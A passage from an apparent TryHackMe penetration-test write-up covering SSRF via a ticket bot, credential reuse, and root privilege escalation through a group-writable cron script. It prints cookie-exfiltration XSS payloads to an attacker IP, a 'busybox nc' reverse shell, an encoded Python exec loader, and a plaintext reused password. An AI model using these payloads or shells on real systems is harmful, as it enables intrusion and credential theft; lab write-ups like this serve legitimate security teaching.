**Remediation:** Never fetch or execute remote content from a user-controlled parameter under any circumstance. If `allow_url_fopen`/`allow_url_include` are enabled for this functionality, disable them; rebuild the "File Viewer" feature around an explicit local allow-list of filenames rather than attacker-controlled path/URL input.

---

### 4.9 SSRF via Ticket-Review Automation (`/opt/admin_bot.py`) (CWE-918) — Medium

**Location:** `/opt/admin_bot.py` (discovered post-exploitation, Section 4.11), triggered indirectly through the `support/create.php` ticket `message` field

**Description:** `support/create.php`'s source (pulled via Finding 4.4's LFI) contains the comment `// Message stored raw - no XSS filtering (intentional vulnerability)`, and the dashboard referenced an "admin reviews tickets" workflow. The initial working hypothesis was a **headless-browser-driven blind XSS** against an admin's live session — tested as follows:

```html
<script>
  new Image().src = 'http://10.49.120.226:8000/hit?c=' + document.cookie;
</script>
```

Submitted as a ticket message; after a short delay, a request landed on the attacker listener:

```
10.49.179.121 - - [29/Oct/2026 13:51:28] "GET /hit?c= HTTP/1.1" 404 -
```

The request fired (confirming _something_ processes ticket content), but `document.cookie` was empty — initially attributed to a sandboxed/opaque-origin iframe rendering context. A follow-up payload attempting to read an authenticated response via `fetch()` similarly returned nothing:

```html
<script>
  fetch('/dashboard.php')
    .then((r) => r.text())
    .then(
      (d) =>
        (new Image().src =
          'http://10.49.120.226:8000/exfil?d=' + encodeURIComponent(d)),
    );
</script>
```

— also landed with an empty payload every time, regardless of the target path (including the always-populated, unauthenticated `/index.php`). **This hypothesis was corrected once OS-level access revealed the actual source** (Finding 4.11):

```python
# /opt/admin_bot.py (relevant excerpt)
def process(t):
    msg = t["message"]
    url_pat = r"https?://[A-Za-z0-9./_?&=:%+-]+"
    urls = re.findall(url_pat, msg)
    for url in set(urls):
        requests.get(url, cookies=COOKIE, timeout=5)
```

There is **no browser and no JavaScript execution at all.** `admin_bot.py` is a plain Python daemon that regexes ticket `message` text for anything matching an `http(s)://` URL pattern and performs a blind, response-discarding `requests.get()` on it — using a hardcoded, freshly-computed valid `nexus_session` admin cookie (built once per script run from the leaked `APP_SECRET`, identical in form to Finding 4.6's forgery technique). This fully explains the earlier results in hindsight: relative-path `fetch()` payloads never matched the URL regex at all (so `requests.get()` was never invoked for them), and the "hits" that did land were simply the literal absolute-URL beacon substring from the raw ticket text being regex-extracted and GET'd verbatim — not real exfiltrated response content.

**Impact:** The vulnerability is real, but its nature is **SSRF with an automatically-attached privileged (admin) session**, not client-side XSS. An attacker can cause this process — confirmed in 4.11 to run as `root` — to issue arbitrary, authenticated-as-admin outbound HTTP GET requests. Since the response is discarded and never returned, this is not directly useful as a read-oracle, but it is a genuine blind SSRF primitive capable of reaching network locations the automation host can access (e.g., `localhost`-bound services) that an external attacker cannot reach directly — notably relevant here since MySQL (Finding 4.5) is `localhost`-only.

**Remediation:** Do not render or fetch user-controlled URLs from ticket content at all; if a preview/link-check feature is required, use a strict allow-list of destinations and strip any session/authentication context from the outbound request. Never hold a long-lived, privileged, hardcoded session credential inside an automation script.

---

### 4.10 Credential Reuse — Database Password Reused as OS Account Password (CWE-521) — High

**Location:** OS-level `devops` account on the target host

**Description:** With a shell as `www-data` (Finding 4.8), process and file-system enumeration was used to pivot toward the system's own users. `pspy64` (continuous, non-root process monitor) was uploaded and run to observe live process activity:

```bash
devops@tryhackme-2404:/opt/tools$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/10/30 13:22:57 CMD: UID=1001  PID=1723   | ./pspy64
2026/10/30 13:22:57 CMD: UID=1001  PID=1701   | bash
2026/10/30 13:22:57 CMD: UID=1001  PID=1690   | (sd-pam)
2026/10/30 13:22:57 CMD: UID=0     PID=1689   |
2026/10/30 13:22:57 CMD: UID=0     PID=1688   |
2026/10/30 13:22:57 CMD: UID=1001  PID=1687   | /usr/lib/systemd/systemd --user
2026/10/30 13:22:57 CMD: UID=0     PID=1675   | su devops
2026/10/30 13:22:57 CMD: UID=33    PID=1667   | /usr/bin/bash -i
2026/10/30 13:22:57 CMD: UID=33    PID=1666   | /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNrNGmtv20bys/grNj4UIhuGsX2HayFUARxbjoUqVho7bVOfQVDUyiJCkSq5iu3D/fib2feSKzvXTxfAErU7O+/XDlNstnXDSN3GpH2ED8YeY7LFj3Zd0oeYrPKKlTGhTVPVsMiaXc7gu7irMlhmtNkU/DAtKW6wdUOzZVHdBQIkEV+h/HU1fTe9vFbn8Wd6dj6L9gL/8mnqga7qZpOVxb9pus3YmoxJmW0Wy4zgrxHIkuBDglD4EKoF+rDNquXXrGk7S7uWNiH+jqIoCIoVqiL5Spu2qKu0qFb1zeEtGY/J8SgYFEJhv+zojpKsJX/iQ0DLlppNscaaR7NU1MFgsVutaJOXWdsCz0WdvH1ktJ3OA/qQ0y0zwFesAQ3CRueIWk80QHB1MZnNYGv4etc2rxdF9XqRtethcDm5Tt9+Ok+vpn9MYPvvxz/888dA4HlP25ZWd7QBgur4UTD4OJGwx8Fg8vvkFE8BwPXHycl7eP5HoH6kp/MzhBu+uBjqtbefrydXsCgcJMmzMm/BQKF1BFQ7mE0u9XE8ndoLL4bkJVELAnYfWgWFOK8/f5hoHG8RqbPCseoVCb4Pr4ZDxBeTk7PJRz97Ls73J7+nH04+z+YnZwAZHpGffiLhj+R7omWIIvKKHMGfIQ8UlnRFUvCwgqVpCCG0ioll8QgMNMDVpKQV4L2sK6pWimq7Y6kAhi3rVBhZp+7Y+hmgDXhDdkf3QQkeJVCYssctjUm6zFjGuYNYASqhWCBvjG8llkoQcNBkRUvJr1m5o5OmqZvwQMOSVZNtKETvY1lnS8LqGgK6uaMj8t0ScMLHAgPlgHxHQkMt9hOLULKGsl1TKetus/xLaIAts8Y29y8thMZKIC0KjdscLhhIZXDvyViRbyhb18tQLiuVrShdSpNqbfUsl9w3BaMhB/Dut5R+CQ8R5+B+XZSUXDc7yvUJmq9qRpSh+doAHtIKCANvRhYTR69I3y8SRsuSu8NggHygWD02MKeHCrmA9WByhdHOIbT7YkwUAsHrYAFYvwQOMhORu6pjNZ0pYp8Qd5R9RdcKowhy9T4GlTb3bAPlKs9ABA4hU7pUi1Kr5lTq0g2fb1emxmlx08H1nDo1ij367KCzhecu/ZSydW6LvWJyEXzRYtSfWmGyD0PUs75Mcc9L4FW+Y7/BY0HLJVEpS8IGT4aZb8/CKgsoVF+abUbe9J0WS/hogRj0DmMUx4p8dCAA0Kk3e0hV0hv7sxm4Gc9QxVIzx90CeOsUBMw3qei+Ojsp3yrr/Ats6P4smcGCKQOSY2RQPqodhE/zsm65/2P+cTjxb6WSD/GDA3a5Qoi4A4BtWbGlhi2X+HkGMbmHutgTJcmRqGg5XR4k5uAKjGoaRwylEWlou60rkbXRWC+JDj4gQx9oHlrsetaRW1zWqeNpejab8F3ZIaUqrlkRnZTUmOEu0m1E2a6LlfFEt+oYJ0iy/M9d0Qglix7VKE07l621nt/x/jbhLbCINQcggeAxaUthtv2zj9z1XuOk1/wpZNgOsLEGjUkFHcP4AJ8xiUE4kldvyAEopaHbRlkwirwUEqjbDeOcrwq4WJSPxliWnhq40mQtDXsVnWu1U47tbK8VATyHkVWsudkNS9x3hTPJlCVS+MDYZQARIQAsz4uNX4qbA5lf8Z5qFNh1gPMMTFa14Vo1RtpdJZyhYTmOENHUnDekm7Y8Ts5hb0ZdyNvI0hIH6eG6Dby4lPptbWl57C7ITggdxnpJylEw3+yFtk+1W0j/NjuGEcugsrR5jaxidUlLGaid06ErLsflldbKjEZYb67eK6tKV8+JqpmAsON8KITSnIBWg6i8XvE82McrHfDgIKFVXi+F43fDw6dMeZC34EEg2BLpOuWdn+zTx92EiQzfd/NevWMYn6Lsx+TYLAlD9fOwaiM4LcwrkuctewRCZ/NP1+n5FFrUOSkqcl8WLeMRhA9Jtt1ic
2026/10/30 13:22:57 CMD: UID=33    PID=1623   | /usr/bin/bash
2026/10/30 13:22:57 CMD: UID=33    PID=1619   | sh -c uname -a; w; id; /bin/sh -i
2026/10/30 13:22:57 CMD: UID=0     PID=1609   |
2026/10/30 13:22:57 CMD: UID=0     PID=1575   |
2026/10/30 13:22:57 CMD: UID=33    PID=1535   | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=0     PID=1478   |
2026/10/30 13:22:57 CMD: UID=0     PID=1277   |
2026/10/30 13:22:57 CMD: UID=0     PID=1276   |
2026/10/30 13:22:57 CMD: UID=0     PID=1275   |
2026/10/30 13:22:57 CMD: UID=0     PID=1274   |
2026/10/30 13:22:57 CMD: UID=0     PID=1228   |
2026/10/30 13:22:57 CMD: UID=0     PID=1129   |
2026/10/30 13:22:57 CMD: UID=0     PID=1117   | /usr/bin/python3 /opt/admin_bot.py
2026/10/30 13:22:57 CMD: UID=115   PID=1070   | /usr/sbin/mysqld
2026/10/30 13:22:57 CMD: UID=0     PID=1024   | /snap/amazon-ssm-agent/13009/ssm-agent-worker
2026/10/30 13:22:57 CMD: UID=33    PID=931    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=930    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=926    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=925    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=924    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=0     PID=917    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=997   PID=730    | /usr/lib/polkit-1/polkitd --no-debug
2026/10/30 13:22:57 CMD: UID=104   PID=723    | /usr/sbin/rsyslogd -n -iNONE
2026/10/30 13:22:57 CMD: UID=0     PID=708    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
2026/10/30 13:22:57 CMD: UID=0     PID=683    | /sbin/agetty -o -p -- \u --noclear - linux
2026/10/30 13:22:57 CMD: UID=0     PID=665    | /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
2026/10/30 13:22:57 CMD: UID=0     PID=624    | /usr/lib/systemd/systemd-logind
2026/10/30 13:22:57 CMD: UID=0     PID=623    | /usr/lib/snapd/snapd
2026/10/30 13:22:57 CMD: UID=0     PID=618    | /snap/amazon-ssm-agent/13009/amazon-ssm-agent
2026/10/30 13:22:57 CMD: UID=103   PID=606    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2026/10/30 13:22:57 CMD: UID=0     PID=605    | /usr/sbin/cron -f -P
2026/10/30 13:22:57 CMD: UID=0     PID=601    | /usr/sbin/acpid
2026/10/30 13:22:57 CMD: UID=100   PID=544    | /usr/lib/systemd/systemd-networkd
2026/10/30 13:22:57 CMD: UID=102   PID=336    | /usr/lib/systemd/systemd-timesyncd
2026/10/30 13:22:57 CMD: UID=101   PID=333    | /usr/lib/systemd/systemd-resolved
2026/10/30 13:22:57 CMD: UID=0     PID=213    |
2026/10/30 13:22:57 CMD: UID=0     PID=199    |
2026/10/30 13:22:57 CMD: UID=0     PID=185    | /usr/lib/systemd/systemd-udevd
2026/10/30 13:22:57 CMD: UID=0     PID=171    | /sbin/multipathd -d -s
2026/10/30 13:22:57 CMD: UID=0     PID=170    |
2026/10/30 13:22:57 CMD: UID=0     PID=169    |
2026/10/30 13:22:57 CMD: UID=0     PID=123    | /usr/lib/systemd/systemd-journald
2026/10/30 13:22:57 CMD: UID=0     PID=84     |
2026/10/30 13:22:57 CMD: UID=0     PID=83     |
2026/10/30 13:22:57 CMD: UID=0     PID=82     |
2026/10/30 13:22:57 CMD: UID=0     PID=81     |
2026/10/30 13:22:57 CMD: UID=0     PID=70     |
2026/10/30 13:22:57 CMD: UID=0     PID=67     |
2026/10/30 13:22:57 CMD: UID=0     PID=66     |
2026/10/30 13:22:57 CMD: UID=0     PID=65     |
2026/10/30 13:22:57 CMD: UID=0     PID=64     |
2026/10/30 13:22:57 CMD: UID=0     PID=63     |
2026/10/30 13:22:57 CMD: UID=0     PID=62     |
2026/10/30 13:22:57 CMD: UID=0     PID=61     |
2026/10/30 13:22:57 CMD: UID=0     PID=60     |
2026/10/30 13:22:57 CMD: UID=0     PID=59     |
2026/10/30 13:22:57 CMD: UID=0     PID=58     |
2026/10/30 13:22:57 CMD: UID=0     PID=57     |
2026/10/30 13:22:57 CMD: UID=0     PID=56     |
2026/10/30 13:22:57 CMD: UID=0     PID=55     |
2026/10/30 13:22:57 CMD: UID=0     PID=54     |
2026/10/30 13:22:57 CMD: UID=0     PID=53     |
2026/10/30 13:22:57 CMD: UID=0     PID=52     |
2026/10/30 13:22:57 CMD: UID=0     PID=51     |
2026/10/30 13:22:57 CMD: UID=0     PID=50     |
2026/10/30 13:22:57 CMD: UID=0     PID=49     |
2026/10/30 13:22:57 CMD: UID=0     PID=48     |
2026/10/30 13:22:57 CMD: UID=0     PID=47     |
2026/10/30 13:22:57 CMD: UID=0     PID=46     |
2026/10/30 13:22:57 CMD: UID=0     PID=45     |
2026/10/30 13:22:57 CMD: UID=0     PID=43     |
2026/10/30 13:22:57 CMD: UID=0     PID=42     |
2026/10/30 13:22:57 CMD: UID=0     PID=41     |
2026/10/30 13:22:57 CMD: UID=0     PID=40     |
2026/10/30 13:22:57 CMD: UID=0     PID=39     |
2026/10/30 13:22:57 CMD: UID=0     PID=38     |
2026/10/30 13:22:57 CMD: UID=0     PID=37     |
2026/10/30 13:22:57 CMD: UID=0     PID=36     |
2026/10/30 13:22:57 CMD: UID=0     PID=34     |
2026/10/30 13:22:57 CMD: UID=0     PID=32     |
2026/10/30 13:22:57 CMD: UID=0     PID=31     |
2026/10/30 13:22:57 CMD: UID=0     PID=30     |
2026/10/30 13:22:57 CMD: UID=0     PID=29     |
2026/10/30 13:22:57 CMD: UID=0     PID=28     |
2026/10/30 13:22:57 CMD: UID=0     PID=27     |
2026/10/30 13:22:57 CMD: UID=0     PID=26     |
2026/10/30 13:22:57 CMD: UID=0     PID=24     |
2026/10/30 13:22:57 CMD: UID=0     PID=23     |
2026/10/30 13:22:57 CMD: UID=0     PID=22     |
2026/10/30 13:22:57 CMD: UID=0     PID=21     |
2026/10/30 13:22:57 CMD: UID=0     PID=20     |
2026/10/30 13:22:57 CMD: UID=0     PID=19     |
2026/10/30 13:22:57 CMD: UID=0     PID=18     |
2026/10/30 13:22:57 CMD: UID=0     PID=17     |
2026/10/30 13:22:57 CMD: UID=0     PID=16     |
2026/10/30 13:22:57 CMD: UID=0     PID=15     |
2026/10/30 13:22:57 CMD: UID=0     PID=14     |
2026/10/30 13:22:57 CMD: UID=0     PID=13     |
2026/10/30 13:22:57 CMD: UID=0     PID=12     |
2026/10/30 13:22:57 CMD: UID=0     PID=10     |
2026/10/30 13:22:57 CMD: UID=0     PID=9      |
2026/10/30 13:22:57 CMD: UID=0     PID=8      |
2026/10/30 13:22:57 CMD: UID=0     PID=7      |
2026/10/30 13:22:57 CMD: UID=0     PID=6      |
2026/10/30 13:22:57 CMD: UID=0     PID=5      |
2026/10/30 13:22:57 CMD: UID=0     PID=4      |
2026/10/30 13:22:57 CMD: UID=0     PID=3      |
2026/10/30 13:22:57 CMD: UID=0     PID=2      |
2026/10/30 13:22:57 CMD: UID=0     PID=1      | /sbin/init
2026/10/30 13:23:01 CMD: UID=0     PID=1734   | /usr/sbin/CRON -f -P
2026/10/30 13:23:01 CMD: UID=0     PID=1735   | /usr/sbin/CRON -f -P
2026/10/30 13:23:01 CMD: UID=0     PID=1736   |
2026/10/30 13:23:01 CMD: UID=0     PID=1737   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1738   |
2026/10/30 13:23:01 CMD: UID=0     PID=1739   |
2026/10/30 13:23:01 CMD: UID=0     PID=1742   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1741   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1740   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:23 CMD: UID=0     PID=1743   |
2026/10/30 13:23:28 CMD: UID=0     PID=1744   | /bin/hostname --fqdn
2026/10/30 13:24:01 CMD: UID=0     PID=1745   | /usr/sbin/CRON -f -P
2026/10/30 13:24:01 CMD: UID=0     PID=1746   | /usr/sbin/CRON -f -P
2026/10/30 13:24:01 CMD: UID=0     PID=1749   | systemctl is-active --quiet apache2
2026/10/30 13:24:01 CMD: UID=0     PID=1747   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1750   | systemctl is-active --quiet mysql
2026/10/30 13:24:01 CMD: UID=0     PID=1752   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1751   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1753   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:24 CMD: UID=0     PID=1754   | ps -e -o pid,ppid,state,command
```

Among standard system processes, two stood out — a long-running root-owned Python process and the system's `/etc/passwd`, checked directly:

```bash
cat /etc/passwd
```

```
...
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
...
devops:x:1001:1001::/home/devops:/bin/bash
```

`devops` is a genuine, login-capable local account (UID 1001, `/bin/bash`) — distinct from the web application's `firstname.lastname` username convention, and matching the `/home/devops` directory already visible but inaccessible as `www-data`. Given the engagement's established pattern of weak/reused credentials (Finding 4.2) and a password literally named after the role it belongs to (`config.php`'s `DB_PASS = 'D3v0ps!2024'`, Finding 4.5), that credential was tried directly against the OS account:

```bash
su devops
Password: D3v0ps!2024
```

```
devops@tryhackme-2404:~$ whoami
devops
```

**Captured:**

```bash
devops@tryhackme-2404:~$ cat user.txt
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

**Note:** access here was via `su` from the existing web-shell foothold, not a direct SSH login — the flag's own naming (`s5h_cr3d_r3u53`) suggests this credential may also be valid over actual SSH (port 22 was confirmed open in initial recon, Section 3), which was **not tested** this session; listed as an open item (Section 6).

**Impact:** A single leaked application secret (`DB_PASS`) grants a full, interactive OS-level shell as a real system user, entirely bypassing the web application. Confirms this engagement's password-reuse theme extends across the web app / database / operating system trust boundaries, not just within the web app itself.

**Remediation:** Never reuse secrets across trust boundaries (application, database, OS, infrastructure) — a leak in one must not compromise the others. Enforce unique, generated credentials per system/service, and screen for reuse as part of credential provisioning.

---

### 4.11 World-Writable Root-Owned Automation Script (`/opt/admin_bot.py`) (CWE-732) — High (privilege escalation — not yet completed)

**Location:** `/opt/admin_bot.py`, managed by the systemd unit `admin-bot.service`

**Description:** `pspy64` (Finding 4.10) surfaced the ticket-review process identified in Finding 4.9 as a specific, persistent, root-owned process:

```
2026/10/29 14:58:20 CMD: UID=0  PID=1107  | /usr/bin/python3 /opt/admin_bot.py
```

File-permission and service-definition checks (as `devops`) confirmed both the write primitive and its restart behavior:

```bash
devops@tryhackme-2404:/opt$ ls -la admin_bot.py
-rwxrwxrwx 1 root root 1870 May  7 20:26 admin_bot.py
```

```bash
devops@tryhackme-2404:/opt$ cat /etc/systemd/system/admin-bot.service
[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/admin_bot.py
Restart=always
RestartSec=10
```

**This is a complete theoretical privilege-escalation chain: any local user can overwrite a script that `root` executes via a service configured to auto-restart on any exit.** Python does not hot-reload a running script, so the already-running process (PID 1107) would not pick up an edit until the service actually restarts — the remainder of this finding is the (unresolved, as of end-of-session) search for a restart trigger `devops` can actually invoke.

**Privilege-escalation enumeration performed, with results:**

| Avenue checked                   | Command                                                                        | Result                                                                                                                                                                                                                                        |
| -------------------------------- | ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo` rights                    | `echo 'D3v0ps!2024' \| sudo -S -l`                                             | **Denied** — `"user devops may not run sudo on tryhackme-2404"`                                                                                                                                                                               |
| SUID binaries                    | `find / -perm -4000 -type f 2>/dev/null`                                       | Only stock `/snap/core*/...` binaries (standard Ubuntu SUID set) — nothing custom                                                                                                                                                             |
| `cron.hourly` / `cron.daily`     | `ls -la /etc/cron.hourly/ /etc/cron.daily/`, `cat /etc/cron.hourly/*`          | `cron.hourly` empty (placeholder only); `cron.daily` only stock package entries — nothing custom, nothing referencing `admin-bot` or `health_report.sh`                                                                                       |
| `logrotate.d`                    | `cat /etc/logrotate.d/* \| grep -i 'admin\|nexus\|restart'`                    | Only the stock MySQL entry matched — no custom `postrotate` restart hook found                                                                                                                                                                |
| Direct service restart           | `systemctl restart admin-bot.service`                                          | **Denied**, but informative: PolicyKit prompted `Authenticating as: Ubuntu (ubuntu)` — this action is scoped to the `ubuntu` local account specifically, not open to `devops` or passwordless                                                 |
| Group-writable monitoring script | `ls -la /opt/monitoring/health_report.sh` → `-rwxrwxr-- 1 root devops 537 ...` | Writable by the `devops` _group_ (which the `devops` user belongs to) — but **no confirmed execution trigger found anywhere** (absent from cron, logrotate, and systemd timers: `systemctl list-timers --all` showed no entry referencing it) |

**Current state:** No trigger for `admin-bot.service`'s restart was ever found. A reverse-shell payload was appended to the separate `/opt/monitoring/health_report.sh` script as a speculative attempt at end of the prior session (`busybox nc 10.49.120.226 4445 -e sh`), on the reasoning that root ownership implied some execution path even though none was confirmed for that file either at the time. `getcap -r / 2>/dev/null` and a direct read of `/usr/share/polkit-1/rules.d/49-ubuntu-admin.rules` (to understand the PolicyKit logic behind the `ubuntu`-scoped restart prompt) remain unexecuted and are listed in Section 6. **This specific avenue (`admin_bot.py`/`admin-bot.service`) was never completed** — `root` was ultimately obtained through a different write primitive, documented in Finding 4.12.

**Impact (if completed):** Full `root` compromise — the script is `root`-executed and fully attacker-writable; only the restart trigger is unresolved.

**Remediation:** Never run a root-owned, auto-restarting service against a world-writable script. Set ownership to `root:root` with `0750` or stricter permissions; if `devops`-initiated restarts of this specific service are a genuine operational need, grant that narrowly via a dedicated `sudoers` entry (`devops ALL=(root) NOPASSWD: /usr/bin/systemctl restart admin-bot.service`) rather than relying on PolicyKit defaults tied to an unrelated account.

---

### 4.12 Cron-Triggered Group-Writable Script → Full Root Compromise (CWE-732) — Critical

**Location:** `/opt/monitoring/health_report.sh`, executed every 60 seconds by a cron entry defined in `root`'s own personal crontab

**Description:** The reverse-shell payload appended to `health_report.sh` in Finding 4.11 (at the time, speculative and unverified, since no execution trigger had been confirmed) was revisited. A fresh `pspy64` run showed the script being invoked, as `UID=0`, twice, 60 seconds apart:

```bash
2026/10/30 13:23:01 CMD: UID=0     PID=1737   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1742   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1741   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1740   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1749   | systemctl is-active --quiet apache2
2026/10/30 13:24:01 CMD: UID=0     PID=1747   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1750   | systemctl is-active --quiet mysql
2026/10/30 13:24:01 CMD: UID=0     PID=1752   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1751   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1753   | /bin/bash /opt/monitoring/health_report.sh
```

Unlike the earlier `pspy64` snapshot in Finding 4.10, where every entry shared one identical startup timestamp, these two timestamps genuinely differ by 60 seconds, confirming a live, recurring execution rather than a startup artifact. A 60-second cadence can only come from a `* * * * *`-style cron entry, something `cron.hourly`/`cron.daily` cannot produce (already ruled out in Finding 4.11's enumeration table). The schedule's actual location was tracked down as follows:

```bash
devops@tryhackme-2404:/opt/tools$ cat /etc/crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Only the four standard `run-parts` lines, nothing at one-minute granularity.

```bash
devops@tryhackme-2404:/opt/tools$ ls -la /var/spool/cron/crontabs
ls: cannot open directory '/var/spool/cron/crontabs': Permission denied
devops@tryhackme-2404:/opt/tools$ cat /var/spool/cron/crontabs/root 2>/dev/null
```

Denied outright on the directory listing; the direct file read returned nothing, almost certainly the same denial, swallowed by `2>/dev/null`.

```bash
devops@tryhackme-2404:/opt/tools$ ls -la /etc/cron.d/
total 32
drwxr-xr-x   2 root root  4096 Apr 29  2026 .
drwxr-xr-x 114 root root 12288 Oct 30 13:02 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root   712 Jan 19  2024 php
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
devops@tryhackme-2404:/opt/tools$ cat /etc/cron.d/*
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
```

Only stock `e2scrub_all`, PHP session cleanup, and `sysstat` entries, nothing referencing `health_report.sh`. With `/etc/crontab` and `/etc/cron.d/` both ruled out and `/var/spool/cron/crontabs/` access-denied, the conclusion is that the job is defined in `root`'s own personal crontab (edited via `crontab -e` as root), a location that is correctly inaccessible to `devops` even though the target script itself is group-writable. Reading that file was not necessary to exploit the primitive: the `pspy64` timing evidence alone was sufficient confirmation that the script executes as root on a fixed interval.

With the payload already in place, catching the callback was a matter of waiting for the next tick:

```bash
└─# python3 penelope.py -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 -> 127.0.0.1 • 10.49.120.226
[+] [New Reverse Shell] => tryhackme-2404 10.49.179.121 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
root@tryhackme-2404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# whoami
root
root@tryhackme-2404:~# pwd
/root
root@tryhackme-2404:~# ls
root.txt  snap
root@tryhackme-2404:~# cat root.txt
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

**Captured:** `uid=0(root)`, confirmed three separate ways (`id`, `whoami`, `pwd`), and the flag read directly from `/root/root.txt`: `THM{pr1v3sc_cr0n_r00t_fl4g5}`.

**Impact:** Full, unauthenticated-strength (beyond the already-established `devops` foothold) compromise of the host as `root`. This is a materially different root cause from Finding 4.11: the exploitable primitive is a group-writable file executed by a cron job in root's personal crontab, not a world-writable file executed by a `Restart=always` systemd service. Both findings independently demonstrate the same underlying class of misconfiguration (a non-root-writable path reaching root-level execution), discovered and exploited via two separate automation scripts on the same host.

**Remediation:** Remove group write access from any script executed by `root`, regardless of execution mechanism (cron, systemd, or otherwise); `health_report.sh` should be `root:root` with `0750` or stricter. More generally, any monitoring/automation script that root executes on a schedule should be treated as a privilege boundary, and its permissions audited with the same rigor as a SUID binary — ownership and schedule should be reviewed together, since cron schedules defined outside world-readable locations (a personal crontab) can hide an otherwise-obvious execution trigger from a lower-privileged account's own enumeration.

---

## 5. Attack Chain (Summary)

```
"Our Team" page              →  7 valid usernames leaked
        │
Password reuse (Hydra)       →  low-priv foothold (sarah.johnson / robert.wilson / emma.taylor)
        │
JWT role claim forged        →  signature never verified server-side (4.3)
        │
LFI via /api/files.php       →  base dir discovered, forgot.php / auth.php / config.php disclosed (4.4)
        │
Secrets extracted            →  APP_SECRET leaked (4.5)
        │
nexus_session cookie forged  →  full admin impersonation as laura.hayes, CISO (4.6)
        │
/api/users/profile.php IDOR →  confirmed independently, needs only plain auth (4.7)
        │
RFI via /api/files.php?name=<URL>  →  remote PHP execution, shell as www-data (4.8)
        │
flag3 captured (/opt/flag3.txt)  →  RCE foothold confirmed
        │
pspy64 + source review  →  "blind XSS" re-diagnosed as SSRF via admin_bot.py, root-owned (4.9)
        │
DB_PASS reused as OS password  →  su devops, flag4 captured (/home/devops/user.txt) (4.10)
        │
admin_bot.py world-writable + Restart=always  →  theoretical root privesc chain identified,
                                                   restart trigger never found (4.11)
